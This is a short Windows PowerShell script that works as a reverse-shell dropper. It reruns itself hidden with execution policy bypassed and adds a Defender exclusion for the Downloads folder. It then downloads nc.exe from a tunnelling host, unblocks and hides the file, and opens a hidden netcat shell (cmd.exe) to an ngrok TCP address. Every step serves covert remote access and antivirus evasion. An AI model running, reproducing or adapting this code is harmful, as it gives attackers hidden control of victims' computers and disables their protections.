function Ensure-WindowsPowerShell {
    if ($PSVersionTable.PSEdition -ne 'Desktop') {
        $script = $MyInvocation.MyCommand.Definition
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$script`""
        exit
    }
}
Ensure-WindowsPowerShell

try {
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue
} catch {}

try {
    $ncUrl = "https://5eb002534d05f6.lhr.life/nc.exe"  # Replace this with your own HTTPS URL
    $ncPath = Join-Path -Path ([Environment]::GetFolderPath("Downloads")) -ChildPath "nc.exe"

    Invoke-WebRequest -Uri $ncUrl -OutFile $ncPath -UseBasicParsing

    # Unblock the file to remove Zone.Identifier
    Unblock-File -Path $ncPath

    # Hide the file (optional)
    Set-ItemProperty -Path $ncPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
} catch {
    Write-Error "Failed to download or unblock nc.exe: $_"
    exit
}

try {
    $ngrokHost = "6.tcp.ngrok.io"
    $ngrokPort = 15655
    $cmd = "`"$ncPath`" $ngrokHost $ngrokPort -e cmd.exe"

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmd" -WindowStyle Hidden
} catch {
    Write-Error "Failed to start reverse shell: $_"
}
